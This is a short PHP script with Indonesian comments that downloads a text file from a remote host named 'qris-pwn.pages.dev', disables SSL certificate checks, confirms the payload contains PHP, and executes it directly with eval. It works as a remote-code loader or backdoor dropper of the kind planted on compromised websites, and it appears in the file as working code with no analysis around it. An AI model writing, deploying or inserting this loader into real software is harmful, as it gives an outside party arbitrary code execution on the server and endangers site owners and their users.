<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$url = "https://qris-pwn.pages.dev/jack.txt";

/**
 * AMBIL DATA VIA CURL
 */
$ch = curl_init($url);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_USERAGENT      => "Mozilla/5.0",
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_TIMEOUT        => 15,
]);

$data = curl_exec($ch);
$err  = curl_error($ch);
$code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($data === false || $code !== 200) {
    die("❌ CURL GAGAL: $err | HTTP $code");
}

/**
 * VALIDASI ISI HARUS PHP
 */
if (stripos($data, "<?php") === false) {
    echo "<pre>❌ ISI BUKAN PHP:\n\n";
    echo htmlspecialchars(substr($data, 0, 800));
    echo "</pre>";
    exit;
}

/**
 * JALANKAN LANGSUNG TANPA CACHE
 */
eval('?>' . $data);
